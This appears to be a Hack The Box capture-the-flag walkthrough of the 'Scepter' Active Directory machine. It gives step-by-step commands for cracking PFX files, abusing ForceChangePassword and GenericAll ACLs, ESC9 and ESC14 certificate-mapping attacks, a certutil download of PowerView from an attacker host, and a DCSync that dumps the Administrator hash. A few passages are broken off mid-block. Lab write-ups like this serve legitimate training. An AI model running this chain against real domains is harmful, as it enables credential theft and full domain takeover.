This is my comprehensive walkthrough for solving **Scepter**, a challenging Active Directory machine on Hack The Box. This box required in-depth enumeration, methodical abuse of Active Directory Certificate Services **ADCS**, and chaining multiple privilege escalation paths across ADCS misconfigurations, ACL abuse, and classic Active Directory attacks.

In the initial enumeration phase we discovered an exposed **NFS** share exposing sensitive files related to certificates, including PFX files. After cracking its password, we used the private key and certificate was in the share to generate a valid PFX file for the user d.baker using cracked password. This allowed us to authenticate as d.baker and extract his Kerberos ticket and NT hash.

Upon enumeration, we identified that d.baker was a member of the Staff group, which had enrollment rights on a vulnerable certificate template **ESC9**. This template enforced the inclusion of the user's *email* in the certificate through the `SubjectAltRequireEmail` flag. This would normally allow us to impersonate another user via certificate authentication if we could control d.baker's mail attribute. However, d.baker himself did not have the privileges to modify his own attributes.

By compromising a.carter resetting their password using `ForceChangePassword` rights, and leveraging `GenericAll` permissions on the Staff Access Certificate OU, we obtained the ability to modify users within this OU, including changing d.baker's *email* attribute. This allowed us to abuse **ESC9** fully by setting d.baker's mail attribute to impersonate h.brown, a user with higher privileges.

We then requested a new certificate for d.baker with the modified *email*, authenticated as h.brown, and extracted his NT hash.

Finally, with h.brown's privileges, we identified through ACL enumeration that he had write access to `altSecurityIdentities` on p.adams, a Domain Admin user. Using this, we performed an **ESC14** attack by explicitly mapping our certificate to p.adams. This granted us full authentication as p.adams, from which we executed a **DCSync** attack to extract the Administrator's NTLM hash, completing the domain compromise.

This machine highlighted the importance of carefully managing certificate templates, ACL permissions, and attribute control within Active Directory environments.

Let’s walk through the exploitation in detail.

## Reconnaissance
### Network Scanning:
![](https://cdn-images-1.medium.com/max/1000/1*Jue7Bfz9GoSYeyNjV8BGdg.png)

The Nmap scan reveals that the target is a Windows Active Directory environment hosting typical domain controller services such as Kerberos (88), LDAP (389/636/3268/3269), SMB (445), and DNS (53), which aligns with the nature of this machine. The host is identified as DC01 within the scepter.htb domain, confirming it is likely a domain controller.

An unusual observation is the presence of NFS services (111 and 2049), which are uncommon on Windows and typically seen in Unix/Linux environments. This could indicate misconfiguration or be part of the intended scenario. Further enumeration will clarify whether these services are actively used or simply exposed unnecessarily.

Normally, the next steps would focus on enumerating LDAP and SMB for potential anonymous access, as we currently lack valid credentials to enumerate users or shared resources. However, the exposed NFS service may also offer an unexpected attack vector worth investigating.

For now, we will proceed with enumerating the **NFS**. The exposure of NFS is the only oddity and might represent a potential attack surface later in the engagement.

### Environment Configuration
Before moving forward, it’s important to configure the environment properly for Kerberos-based authentication to avoid common issues later.
1. Update /etc/hosts for Local Name Resolution

    ```bash
    echo '10.10.11.65  scepter.htb  dc01.scepter.htb' | sudo tee -a /etc/hosts
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*zL2LiZAFUMyCd7NT-fmqWQ.png)

2. Sync System Time to Prevent Kerberos Time Skew Errors

    Kerberos is sensitive to time differences. We have to sync the machine time with the domain controller.

    ```bash
    sudo ntpdate -u scepter.htb
    ```
3. Configure `/etc/krb5.conf` for Kerberos

    We configure the `/etc/krb5.conf` file to point explicitly to the target domain for Kerberos authentication and its important if we would rely on tikets.
    ```conf
    [libdefaults]
        default_realm = SCEPTER.HTB
        dns_lookup_realm = false
        dns_lookup_kdc = false
        forwardable = true
        renewable = true

    [realms]
        SCEPTER.HTB = {
            kdc = 10.10.11.65
            admin_server = 10.10.11.65
        }

    [domain_realm]
        .scepter.htb = SCEPTER.HTB
        scepter.htb = SCEPTER.HTB
    ```

### Service Enumeration:
#### 1. NFS

1. Identify exposed NFS share

    ```bash
showmount -e 10.10.11.65
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*aiFHP0LPsbhmO1sWHtIYpw.png)
        
    The **`helpdesk`** NFS share is exposed and allows access to everyone.
2. Mounting and Enumerating the NFS Share
    + Create a local directory for mounting 

        ```bash
mkdir -p /tmp/nfs
        ```
    + Mount the share
        ```bash
sudo mount -t nfs -o nolock 10.10.11.65:/helpdesk /tmp/nfs
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*zjfV9yQEELZLFghveVpV2Q.png)
    + Copy the files locally for easier access
        ```bash
sudo cp -r /tmp/nfs/ ./helpdesk
        ```
    + Fix permissions to allow the current user to access the files
        ```bash
sudo chown -R $USER:$USER
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*ChMJXQfzW68q91B94BHs-A.png)

Inside the exposed share, we found several certificate-related files. These files include private keys (.key), Certificate (.crt) and personal information exchange files (.pfx). Such files can potentially be abused to authenticate within an Active Directory environment, depending on how certificates are configured.

#### 2. SSL/TLS Certificate
   To verify whether the domain is using its own ADCS, we inspected the SSL/TLS certificate presented by the Global Catalog over SSL (port 3269)
    ```bash
    openssl s_client -connect 10.10.11.65:3269 -showcerts
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*I02vvMFejEZvjLcZYy__EA.png)
    The output confirms that the server is using a certificate issued by its own internal CA named scepter-DC01-CA.
## Exploitation
### Cracking the .pfx Files
1. Inspecting the .pfx Files
We can start by extracting information from the .pfx files using openssl
    ```bash
    openssl pkcs12 -in scott.pfx -info -nodes
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*-bC3DCNsBgIUE9lw6Wll6w.png)
    The .pfx files are password protected, and we couldn’t extract any useful information at this stage. The next logical step is to attempt password cracking through brute-force. 
2. Cracking .pfx Passwords with John the Ripper
    + Convert the .pfx files into a crackable format for John
        ```bash
pfx2john scott.pfx > scott.hash
pfx2john lewis.pfx > lewis.hash
pfx2john clark.pfx > clark.hash
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*BVv11w5qofuc5LXYio8eSw.png)
    + Crack the hashes using john
        ```bash
        john scott.hash --wordlist=/usr/share/wordlists/rockyou.txt
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*s0blcscL8k8XI36WpznipA.png)
        All .pfx files share the same password: newpassword.
3. Auth using pfx files

    With the cracked password, we can now authenticate using the one of the .pfx files
    ```bash
certipy auth -pfx Newclark.pfx -password newpassword -domain scepter.htb -dc-ip 10.10.11.65     
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*hTekyM0fu7VUbOW6EBh8yw.png)
    
    The authentication failed because m.clark's account is revoked or disabled in Active Directory. The `KDC_ERR_CLIENT_REVOKED` error indicates the domain controller is refusing to issue a TGT for this user.

    ![](https://cdn-images-1.medium.com/max/1000/1*NMOCAK2kUOWZbPXqc8Ocfg.png)
    Same error for both other users 


### Pass The Certificate
#### Certificate Enumeration

Inspecting the Certificate from NFS
```bash
openssl x509 -in baker.crt -text -noout
``` 
![](https://cdn-images-1.medium.com/max/1000/1*6s849B96WRI8yG2c3GUBag.png)
The CN of the certificte owner is: `d.baker`

#### Rebuilding .pfx from the .crt and .key 

Since wr got .crt and .key files for baker from NFS, we can create a new .pfx container to try for authentication
It is clear that is our lead, but we had to crack the .pfx file first to gain the used encryption password.

```bash
openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt
```
![](https://cdn-images-1.medium.com/max/1000/1*O4y7TnW80B87RqgwkdHlrw.png)

When prompted, we use the password `newpassword` which was cracked earlier. The other prompts can be left empty.

#### Abusing the Certificate to Obtain TGT via PKINIT

Finally, we used Certipy to authenticate as d.baker via PKINIT and obtain a TGT along with the NTLM hash

```bash
certipy auth -pfx baker.pfx -username d.baker -domain scepter.htb -dc-ip 10.10.11.65
```

![](https://cdn-images-1.medium.com/max/1000/1*8VXBhVTrSPwOlQmp2Mnl5A.png)

This successfully authenticated as d.baker and provided us with Kerberos tickets and NTLM hash, paving the way for further escalation.

#### Checking our access

Using [nxc_bruter](https://github.com/B4l3rI0n/nxc_bruter) which dependes on nxc it just spray using services we need to check at once instead or repeating the process over each service 

```bash
nxc_bruter -i 10.10.11.65 -s all -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce -d scepter.htb
```

![](https://cdn-images-1.medium.com/max/1000/1*iySye7L633Sq76_LkXdK6Q.png)

We have access to LDAP so we can use this for furture usersand group enumeration, or just use bloodhound to visualize the realtion between AD objeccts   

### Using BloodHound to Visualize the Environment

For this step, I used [Bloodhound CE](https://github.com/SpecterOps/BloodHound), the actively maintained version of BloodHound. To enumerate and collect the necessary data, I used [bloodhound-ce-python](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce).

Since we already have both the Kerberos ticket and the NT hash, either method works for enumeration.


+ Using the Ticket
    ```bash
    export KRB5CCNAME=d.baker.ccache
    bloodhound-ce-python -u d.baker -k -ns 10.10.11.65 -d scepter.htb -c all --zip
    ```
+ Using the NT Hash
    ```bash
    bloodhound-ce-python -u d.baker --hashes :18b5fb0d99e7a475316213c15b6f22ce -ns 10.10.11.65 -d scepter.htb -c all --zip
    ```
### BloodHound Analysis
After collecting and ingesting the data into BloodHound, I marked d.baker as owned.


1.  Identify Owned User Permissions and Relationships
    Analysis shows that `d.baker` has Outbound Object Control over `a.carter`. `d.baker` can **ForceChangePassword** on `a.carter`. This allows `d.baker` to change `a.carter`'s password without needing the current one.
    ![](https://cdn-images-1.medium.com/max/1000/1*PayQunvR2L-pK5A0k37UgA.png)
2.  Groups our owned user member of 
    ![](https://cdn-images-1.medium.com/max/1000/1*E32OY136HdGXCMlwISY5Qg.png)

    Our user is member of the Staff
3.  Mapping Shortest Path from Owned Object
    ![](https://cdn-images-1.medium.com/max/1000/1*6Uwr8-eDX6FZf8eHxWwCeQ.png)
    
    **d.baker ➔ a.carter ➔ IT Support ➔ Staff Access Certificate OU**

    
    The attack path shows that `d.baker` has **Outbound Object Control** over `a.carter`, allowing them to change `a.carter`'s password. Once compromised, `a.carter` is a member of the `IT Support` group, which in turn has **GenericAll** rights over the `Staff Access Certificate` OU. This grants control over objects within that OU.

    ![](https://cdn-images-1.medium.com/max/1000/1*PHRkQ2gQQ1fjHZaHyPOFWQ.png)
    
    One important observation is that the `Staff Access Certificate` OU already contains our **owned user**. It's worth enumerating this OU before exploiting the attack path to see if it reveals any useful leads or additional opportunities.

3. Mapping Principals with DCSync Privileges

    ![](https://cdn-images-1.medium.com/max/1000/1*1ommYgsaU8HHY6DB3fOHIQ.png)
    Only the `REPLICATION OPERATORS` group has extended rights over the DC, allowing its members to perform DCSync operations. This group should be marked as high-value

    Further inspection shows that the `REPLICATION OPERATORS` group has only one member, making this user our primary target for privilege escalation.
    ![](https://cdn-images-1.medium.com/max/1000/1*5gWIlymgvqFT7N9wGvI5Sg.png) 

4. Noting `Domain Admins` Group Members
    
    This time, the `DOMAIN ADMINS` group contains only a single normal user `ADMINISTRATOR`.
    ![](https://cdn-images-1.medium.com/max/1000/1*nN_h9ftv9OMQe0jRxHmk7w.png)

5. Noting `Remote Management Users` Group Members
    
    Members of the `Remote Management Users` group can remotely manage the machine via WMI, WinRM, or similar protocols. Later, this access can be used to gain a foothold on the machine through one of these accounts.
    
    On this machine, only `h.brown` is a member of this group.

    ![](https://cdn-images-1.medium.com/max/1000/1*7MzifqPHiDwDJx1E26-QQA.png)

### ADCS


#### ADCS Enumeration

As we own a domain user now we can enumerate ADCS to see if it leads us to any misconfigured template or another attack path

+ Enumerating all templates
```bash
certipy find -u d.baker -hashes 18b5fb0d99e7a475316213c15b6f22ce -dc-ip 10.10.11.65 -stdout
```
35 template to review
![](https://cdn-images-1.medium.com/max/1000/1*y9KlgZbItDmxx_UK4zwAnQ.png)
```bash
certipy find -u d.baker -hashes 18b5fb0d99e7a475316213c15b6f22ce -dc-ip 10.10.11.65 -vulnerable -stdout
```
![](https://cdn-images-1.medium.com/max/1000/1*hJ6ekhR9Ov1ZY4l1LEr3pA.png)

The **`StaffAccessCertificate`** template is vulnerable to **ESC9** as it lacks a security extension. This, combined with `d.baker` being part of the `staff` group as enumerated before (which has enrollment rights), makes it a potential target for certificate-based attacks if other prerequisites are met.


#### How ADCS Maps Certificates

Most ADCS attacks involving certificate abuse (especially ESC1 to ESC13) often involve mapping a certificate to the victim account to impersonate them.

ESC9 abuses `altSecurityIdentities` mappings in Active Directory for certificate-based authentication. When a user authenticates with a certificate via PKINIT (Kerberos) or LDAP with TLS client certificate, AD must figure out which user in the directory this certificate belongs to.

Depending on the certificate template and how the CA issues the certificate, Active Directory might map the user through:

+ The certificate Subject/Issuer via altSecurityIdentities
+ The UPN in the certificate
+ The email (mail) address in the certificate's Subject Alternative Name (SAN)
+ The sAMAccountName (rarely, specific templates allow this)

##### **Implicit Mapping (Flexible) – "Like Face Recognition System”**

The certificate’s Subject Alternative Name (SAN) is used for mapping, typically with `DNS` or `UPN` fields.

- Instead of storing the exact certificate details, the system **looks inside the certificate** for things like:
    - **UPN (UserPrincipalName)** – A username in email format (`user@company.com`).
    - **DNS (Domain Name System)** – A machine name (`server.company.com`).
- If the system finds a match, it lets the user in.
- This is like using face recognition to verify employees instead of checking their ID cards.

##### **Explicit Mapping (Strict) – "Like ID Card with a Name on It"**
    
The `altSecurityIdentities` attribute of an account must contain the certificate’s identifier. The certificate must be signed by a trusted CA and match this value.

- The user’s account has a field called **`altSecurityIdentities`**, which lists specific certificates that belong to them.
- If a certificate matches what’s stored in that field, authentication is allowed.
- Think of this like an office ID card that has your photo and name. Security checks if the name matches their records before letting you in.

### ESC9

In ESC9 if `msPKI-Enrollment-Flag` attribute of a certificate template contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag, it effectively negates the embedding of the `szOID_NTDS_CA_SECURITY_EXT` security extension.
This means that irrespective of the configuration of the `StrongCertificateBindingEnforcement` registry key (even if set to its default value of 1), the mapping process will occur as if the registry key had a value of 0 , essentially bypassing strong certificate mapping.
This allows for certificate mapping through weak/implicit methods, such as UPN in the SAN field, even if StrongCertificateBindingEnforcement is enabled on the DC.

Since the `staff` group (which includes `d.baker`) has enrollment rights, We can request a certificate and authenticate as any user whose UPN matches the SAN in this case we would choose high value target. 

#### ESC9 Requirements

1. The `StrongCertificateBindingEnforcement` registry key should not be set to 2, or the `CertificateMappingMethods` should contain the UPN flag ( 0x4 ).
2. The certificate template must incorporate the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` value.
3. The certificate template should explicitly specify client authentication as its purpose.
4. The attacker must possess at least the `GenericWrite` privilege against any user account (account A) to compromise the security of any other user account (account B).

![Alt text](https://cdn-images-1.medium.com/max/1000/1*dPYpyw9L4cPtKpcyH1sO0Q.png)

`Certificate Name Flag : SubjectAltRequireEmail, SubjectRequireEmail`
In this case, the certificate template is configured to automatically populate the certificate’s email (SAN) field from the user’s mail attribute in Active Directory because the template does not allow the user to manually specify it `Enrollee Supplies Subject : False`. This is useful for ESC9 because if we have permissions to modify another user’s mail attribute, we can set it to an email for high value target to impersonate. When we request a certificate for that user, the CA will issue a certificate with the modified email in the SAN field. During authentication, Active Directory uses this email to identify the user, allowing us to impersonate the account linked to that email. This makes exploiting ESC9 possible without modifying attributes like `UPN` or `altSecurityIdentities` directly.

**To successfully obtain a certificate from this template, the request must satisfy these three Subject Name requirements configured in the template:**

+ **SubjectRequireEmail** — The certificate subject must include an email address.
+ **SubjectRequireDnsAsCn** — The DNS name must appear as the Common Name (CN).
+ **SubjectAltRequireEmail** — The Subject Alternative Name (SAN) must include an email address.

If we tried to request a certificate we would get an error cause the email name is unavailable 
![](https://cdn-images-1.medium.com/max/1000/1*YnBJlmB6ewcgSWivIMmuHg.png)

> **Recap:** The `StaffAccessCertificate` template is vulnerable to **ESC9** so we can use this template to impersonate high value target, `staff` group members are allowed to request certificates using this certificate template. Our owned user `d.baker` is member of this group so we can request a certificate using this template. So if we can change `d.baker` email we would be able to abuse the mapping functionality and gain access to another user.
{: .prompt-info }


From previous enumeration using bloodhound there is exploitation path from `d.baker` to `Staff Access Certificate OU`

```scss
d.baker (ForceChangePassword)
        │
        └──➔ a.carter (MemberOf)
                  │
                  └──➔ IT Support (GenericAll)
                            │
                            └──➔ Staff Access Certificate OU (Enrollment Rights)
```
So now if we changed a.carter password and abused the GenericAll rights over the Staff Access Certificate OU then a.carter can take ownership of the objects inside OU by inheritance. Which in this case d.baker so this user whould be able to change d.baker email fied.

### ACL abuse

There are many tools available for AD enumeration and abuse, but I prefer BloodyAD because it consolidates multiple functionalities into a single tool. It allows you to enumerate, manipulate, and exploit various AD components efficiently without switching between multiple tools.

#### ForceChangePassword
`d.baker` can **ForceChangePassword** on `a.carter`

```bash
bloodyAD --host dc01.scepter.htb -d scepter.htb -u d.baker -p :18b5fb0d99e7a475316213c15b6f22ce set password a.carter 'pa$$w0rd'
```
![](https://cdn-images-1.medium.com/max/1000/1*T31CXU3MQemdtKNIY0rPpQ.png)

#### GenericAll over OU

To abuse the GenericAll over an OU we can add a new ACE that will be inherited by the objects under it. Apply a GenericAll ACE to give the privilage to `a.carter` to take ownership of the objects inside:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'a.carter' -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' 'scepter.htb'/'a.carter':'pa$$w0rd' 2>/dev/null
```
![](https://cdn-images-1.medium.com/max/1000/1*sU50yYCXHh2CsS3uU7O5Zw.png)

#### Change email field

We have two high-value targets: h.brown, the only user who is a member of the REMOTE MANAGEMENT USERS group, and p.adams, a member of the Domain Admins group. At this early stage of solving the machine, it won’t be p.adams who is exploitable, but in a real environment, of course, we would test both.

Using BloodyAD, we change d.baker's mail attribute to `h.brown@scepter.htb`. This allows us to request a certificate mapped implicitly to h.brown via ESC9.

With **`bloodyAD set object`**, when you want to modify attributes like mail (email) that aren't explicitly built into the tool’s predefined options, you simply supply the attribute manually using **-v**. The -v flag allows you to specify the value for any LDAP attribute, even if it's not one of the common attributes bloodyAD expects.

![](https://cdn-images-1.medium.com/max/1000/1*6Ygh14hu6g6Jb-eGTr6yzw.png)


```bash
bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'pa$$w0rd' set object d.baker mail -v h.brown@scepter.htb 
```
![](https://cdn-images-1.medium.com/max/1000/1*rjPidFptCsdYyOVIxF_cvA.png)

### ESC9 Exploitation Flow

1. Request a certificate impersonating h.brown

    ```bash
    certipy req -u d.baker -hashes :18b5fb0d99e7a475316213c15b6f22ce -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.10.11.65
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*z8qpbz_ZS0KkQvZGVp6x3g.png)

2. Authenticate as h.brown using the issued certificate

    ```bash
    certipy auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65 -u h.brown
    ```

    ![](https://cdn-images-1.medium.com/max/1000/1*FXrt0NxqU2PIURVrwM54MQ.png)
    
    We gain h.brown's NT hash and a ticket to use for Kerberos authentication. NT hash is useless for now as h.brown is member of protected users group which preventing the use of NTLM authentication and legacy protocols.

### Initial Access

```bash
export KRB5CCNAME=h.brown.ccache
evil-winrm -i dc01.scepter.htb -r scepter.htb 
```

![](https://cdn-images-1.medium.com/max/1000/1*VL8YqYSlGaoe320R6tSgXw.png)



## Privilege Escalation

After initial access to a machine, I typically focus on expanding visibility over the environment by profiling the current user and installed applications. I also check for any internal applications running on local ports; tools like WinPEAS help automate this process.
Next, I prefer to gather another dump of Active Directory data using SharpHound, as BloodHound.py often misses important details, especially around ADCS objects. I also run additional enumeration scripts like PowerView’s Find-Interesting* functions such Find-InterestingDomainAcl to uncover less important ACLs and relationships that BloodHound doesn’t visualize. If enumeration shows no immediate leads, I escalate to tools like Snaffler, Inveigh, or deploy multiple malicious LNK files on shared folders to capture hashes.

### Finding Privileged ACLs

During this enumeration, I identified through PowerView’s `Find-InterestingDomainAcl` function an interesting ACL applied to a high-privilege user `p.adams`. This user was already marked as a potential target during initial recon.

1. Upload PowerView to the machine
    + Using Evil-WinRM’s upload functionality
    + Or with certutil
    ```powershell
    certutil -urlcache -split -f http://ip:port/powerview.ps1
    ```
2. Import PowerView and start enumeration

    ```powershell
    Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

The CMS group has been explicitly granted **WriteProperty** rights over the `altSecurityIdentities` attribute of the **`p.adams`** user object. The permission applies only to this specific attribute, not the entire object. Because the ACE is inherited by the CMS group, any user within that group (including h.brown) can modify p.adams's altSecurityIdentities

![](https://cdn-images-1.medium.com/max/1000/1*bhc6Xe64Fr2Yc_3uSFc6sg.png)

Since h.brown is a member of CMS, this confirms we can modify the altSecurityIdentities attribute on p.adams. We validated this using BloodyAD

```bash
bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -k get writable
```
![](https://cdn-images-1.medium.com/max/1000/1*Ka-WBD6LRWyN_NymT27izQ.png)

For further enumeration of misconfigured altSecurityIdentities, we can use

```bash
Get-ADObject -LDAPFilter '(altSecurityIdentities=*)' -Properties altSecurityIdentities
```

![](https://cdn-images-1.medium.com/max/1000/1*f9PVUoMpasMxZBpwl90WOQ.png)

This revealed that h.brown already has an altSecurityIdentities mapping, but this doesn't help us now since we already control h.brown. Our focus is on p.adams.

After additional research, I confirmed this scenario aligns with ESC14. Because we have WriteProperty rights over the altSecurityIdentities attribute on p.adams, we can abuse this to map our certificate to their account and impersonate them.

### ESC14

#### overview

The **`altSecurityIdentities`** attribute in Active Directory allows mapping a user or computer account to a specific certificate. When a certificate matches this mapping, the principal (user or computer) can authenticate with it via **PKINIT** or **Schannel**.

If an attacker has **WRITE** access to the `altSecurityIdentities` attribute of a user or computer, they can add their **own certificate mapping**. This allows authentication as that user or computer with the attacker's certificate.

> **Key Risk**: Domain Controllers do **not verify certificate issuers** for these explicit mappings. This means attackers can use certificates from **any CA**, including public ones.

---

#### **Mapping Types & Abuse Scenarios (ESC14)**

The SpecterOps research outlines **four main abuse scenarios** depending on the mapping type abused:

| **Scenario** | **Mapping Type**         | **Exploited Attribute** | **Target**    | **Attack Method**                     |
| ------------ | ------------------------ | ----------------------- | ------------- | ------------------------------------- |
| **A**        | `X509IssuerSerialNumber` | `altSecurityIdentities` | User/Computer | Direct write: attacker's cert mapping |
| **B**        | `X509RFC822` (Email)     | `mail`                  | User          | Set `mail` to match cert’s email      |
| **C**        | `X509IssuerSubject`      | `cn`, `name`            | User          | Rename `cn`/`name` to match cert CN   |
| **D**        | `X509SubjectOnly`        | `dNSHostName`           | Computer      | Set `dNSHostName` to match cert CN    |

Many options and settings influence the possibility of explicit certificate mapping but we have 3 weak maping techniques besides X509SKI so we can try any of them

#### **Our Attack Scenario: Targeting p.adams for DCsync**

Our target is **`p.adams`** this user is our path to gaining **DCsync** rights on the domain as identified before. We have **WRITE access** to their **`altSecurityIdentities`** attribute.

**Attack Flow:**
We will abuse this access to assign **our own certificate mapping** to `p.adams`. Once mapped, we authenticate as `p.adams` and leverage their privileges.

                        │
                        └─▶ Full Compromise of Target Principal
```

#### ESC14 Scenario B easiest 


1. Enumerate the Existing altSecurityIdentities Attribute
    ```powershell
    Get-ADUser p.adams -Properties altSecurityIdentities | Select-Object Name, altSecurityIdentities
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*uVrHGaK1uT_qXuJfcBum3w.png)
2. modify `p.adams`'s `altSecurityIdentities` attribute
    + Using BloodyAD
        ```bash
        bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -k set object p.adams altSecurityIdentities -v "X509:<RFC822>h.brown@scepter.htb"
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*NCo8cOzMpr869BMGQUy-zQ.png)
    + Using PowerShell (via ADSI)
        ```powershell
        $victim = [ADSI]"LDAP://CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB"
        $victim.Put("altSecurityIdentities", "X509:<RFC822>h.brown@scepter.htb")
        $victim.SetInfo()
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*u_iiFHhH7vs-C4Dc3Krs3w.png)
    + Using PowerShell (via Set-ADUser)
        ```
        $ASI = (Get-ADUser h.brown -Properties altSecurityIdentities).altSecurityIdentities
        Set-ADUser p.adams -Replace @{altSecurityIdentities = $ASI[0]}
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*O8Twwrlc59cxK0CZz-f09g.png)
3. Confirm change 
    Verify the altSecurityIdentities attribute was updated as expected.

4. Authenticate as High-Privilege User `p.adams` via Certificate Mapping

    With the updated mapping in place, authenticate as p.adams by abusing the existing h.brown PFX certificate obtained earlier through ESC9. This works because the certificate is now explicitly linked to p.adams via altSecurityIdentities (X509 RFC822 mapping).

    ![](https://cdn-images-1.medium.com/max/1000/1*sRrN0bU3Q7doh7GJg6JCQA.png)

    ```bash
certipy auth -pfx d.baker.pfx -username p.adams -domain scepter.htb -dc-ip 10.10.11.65
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*JDM1tUSU35yxoLY2THeM6Q.png)
    We got p.adam ticket and NT hash that we would use later for DCSync

#### ESC14 Scenario A user => user
We have permissions to modify the altSecurityIdentities attribute on the target account. This allows us to map our own certificate to the target by updating this attribute. Once mapped, we can authenticate as the target user using the certificate.

**This is called X509IssuerSerialNumber Mapping**Format:
`X509:<I>DC=domain,...<SR>SerialNumber`
##### Exploitation Steps
1. Enroll a Certificate
    We already have a certificate from impersonating h.brown.
2. Extract Issuer DN and Serial
    Look for:
        + Issuer: Distinguished Name
        + Serial Number: (may contain colons)
    ```bash
    openssl x509 -in d.baker.pfx -noout -text
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*uYGcrHIJHAjsf0DaglfZDg.png)
3. Prepare the Payload
    + Convert the serial
        + Remove colons
        + Convert to lowercase
        + Reverse hex pairs
        ```bash
        echo '62:00:00:00:02:80:94:eb:56:c1:65:ea:96:00:00:00:00:00:02' | tr -d ':' | tr 'A-F' 'a-f' | sed 's/../& /g' | awk '{for(i=NF;i>=1;i--) printf $i} END{print ""}'
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*pp6SIGPrlVCJkK0qnDTa0w.png)
    + Assemble the mapping payload to get this format 'X509:<I>{Issuer}<SR>{serialNumber}'
        ```bash
        echo '62:00:00:00:02:80:94:eb:56:c1:65:ea:96:00:00:00:00:00:02' | tr -d ':' | tr 'A-F' 'a-f' | sed 's/../& /g' | awk '{for(i=NF;i>=1;i--) printf $i} END{print ""}' | xargs -I {} echo "'X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>{}'"
        ```
        *don't forget to change the serial number*
        ![](https://cdn-images-1.medium.com/max/1000/1*eXZCggPK-_JVGKSkyG7-9Q.png)

3. Update `altSecurityIdentities`
    ```bash
    bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -k set object p.adams altSecurityIdentities -v 'X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>02000000000096ea65c156eb94800200000062'
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*BAIOqDrBMgejmxayqWg8-Q.png)

4. Confirm the Change
    ```powershell
    Get-ADUser p.adams -Properties altSecurityIdentities | Select-Object Name, altSecurityIdentities
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*fPjoQzCYJf_eOhm3yJbusw.png)
5. Authenticate as p.adams using the certificate we used its data

    ```bash
    certipy auth -pfx d.baker.pfx -username p.adams -domain scepter.htb -dc-ip 10.10.11.65
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*tsePuIg5sMCAYQ2pR1TKSA.png)
    we again got NT hash and 

#### ESC14 Scenario A machine => user

Alternatively, create a machine account, request a machine certificate, and repeat the same technique.

1. Create a Machine Account
    + Using impacker
        ```bash
        impacket-addcomputer 'scepter.htb/a.carter:pa$$w0rd' -computer-name B4l3rI0n$ -computer-pass 'pa$$w0rd' -dc-ip 10.10.11.65
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*QEIPEm5q-Rk2jA9GMzlM1A.png)
    + Using Linux PowerView 'first time i try'
        ```bash
        powerview -d a.carter:'pa$$w0rd'@scepter.htb
        Add-DomainComputer -ComputerName B4l3rI0n -ComputerPass 'pa$$w0rd' 
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*flSLN7jD2VsMal7SD8oTfQ.png)
2. Request a certificate
    
    ```bash
    certipy req -u 'B4l3rI0n$' -p 'pa$$w0rd' -ca scepter-DC01-CA -template Machine -dc-ip 10.10.11.65
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*4aIydTZ_wRnqa8X8TDpQRA.png)
The following steps are identical to user ➔ user:
Extract serial & issuer, build payload, update altSecurityIdentities, and authenticate.
## DCSync

With access to p.adams's NT hash and ticket, and as a Domain Admin, we have the necessary privileges to perform a DCSync attack. This allows us to impersonate a Domain Controller and request the password hashes of other users directly from the domain, including the Administrator account. This technique abuses the GetNCChanges privilege granted to Domain Admins over the domain naming context.
We can use Impacket's secretsdump.py tool to perform the DCSync and extract the NTLM hash of the Administrator account.

```bash
secretsdump.py 'scepter.htb'/'p.adams'@scepter.htb -hashes :1b925xxxxxxxxxxxxxxx18ce0
```
![](https://cdn-images-1.medium.com/max/1000/1*BR0LqtSfZPKqs2g1OQBMWQ.png)

Then we can use this hash to auth as administrator and access the machine using evil-winrm

```bash
evil-winrm -i dc01.scepter.htb -u Administrator -H a291xxxxxxxxxxxxxxxxxxxxxxc4 
```
